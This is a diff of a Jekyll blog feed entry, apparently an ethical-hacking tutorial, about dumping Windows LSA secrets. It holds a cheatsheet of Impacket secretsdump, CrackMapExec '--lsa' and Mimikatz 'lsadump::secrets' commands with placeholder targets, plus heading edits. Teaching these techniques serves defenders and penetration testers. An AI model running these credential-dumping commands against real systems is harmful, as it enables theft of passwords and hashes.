@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-13T20:19:50-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Down The Rabbit Hole</title><subtitle>Blog site educating the masses about cybersecurity and ethical hacking</subtitle><author><name>Logan Peterson</name></author><entry><title type="html">OS Credential Dumping: LSA Secrets</title><link href="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/" rel="alternate" type="text/html" title="OS Credential Dumping: LSA Secrets" /><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><id>http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets</id><content type="html" xml:base="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-13T20:53:20-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Down The Rabbit Hole</title><subtitle>Blog site educating the masses about cybersecurity and ethical hacking</subtitle><author><name>Logan Peterson</name></author><entry><title type="html">OS Credential Dumping: LSA Secrets</title><link href="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/" rel="alternate" type="text/html" title="OS Credential Dumping: LSA Secrets" /><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><id>http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets</id><content type="html" xml:base="http://localhost:4000/credentialaccess/credentialdumping/os-credential-dumping-lsa-secrets/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;LSA secrets is part of the data that is stored within the Local Security Authority (LSA) in Windows. LSA itself is utilized to store private data all things revolving around passwords hence why we might care about it. They live within the registry and can be found at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets&lt;/code&gt;. Naturally since its in the registry, in order to do anything with it, we’ll need to have administrative access to the system in question. So in for a penny, in for a pound…&lt;/p&gt;
 
 &lt;h1 id=&quot;cheatsheet&quot;&gt;Cheatsheet&lt;/h1&gt;
@@ -13,24 +13,21 @@
 &lt;h2 id=&quot;impacket-secretsdump&quot;&gt;Impacket SecretsDump&lt;/h2&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;    python3 secretsdump.py &amp;lt;AD FQDN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;IP ADDRESS&amp;gt;
-    python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; &amp;lt;NTLM FULL HASH&amp;gt; &amp;lt;AD FQDN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;IP ADDRESS&amp;gt;
+    python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; &amp;lt;NTLM FULL HASH&amp;gt; &amp;lt;AD FQDN&amp;gt;/&amp;lt;USERNAME&amp;gt;@&amp;lt;IP ADDRESS&amp;gt;
     python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; &amp;lt;SAMNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-security&lt;/span&gt; &amp;lt;SECURITYNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; &amp;lt;SYSTEMNAME&amp;gt; LOCAL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;h2 id=&quot;crackmapexec&quot;&gt;CrackMapExec&lt;/h2&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;    crackmapexec smb &amp;lt;IP ADDRESS OR RANGE&amp;gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;USERNAME&amp;gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;PASSWORD&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--lsa&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;h2 id=&quot;mimikatz&quot;&gt;Mimikatz&lt;/h2&gt;
+&lt;h2 id=&quot;mimikatz-windows&quot;&gt;Mimikatz (Windows)&lt;/h2&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsadump::secrets&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/system:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LOCATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SYSTEM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/security:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LOCATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SECURITY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;h1 id=&quot;down-the-rabbit-hole&quot;&gt;Down The Rabbit Hole&lt;/h1&gt;
-&lt;h2 id=&quot;test&quot;&gt;test&lt;/h2&gt;
-&lt;h3 id=&quot;test2&quot;&gt;test2&lt;/h3&gt;
-&lt;h3 id=&quot;test3&quot;&gt;test3&lt;/h3&gt;
-&lt;p&gt;##
-##&lt;/p&gt;
+&lt;h2 id=&quot;attack-demonstration&quot;&gt;Attack Demonstration&lt;/h2&gt;
+&lt;h2 id=&quot;whats-really-happening&quot;&gt;What’s Really Happening&lt;/h2&gt;
 
 &lt;h1 id=&quot;tool-references&quot;&gt;Tool References&lt;/h1&gt;
 &lt;ol&gt;
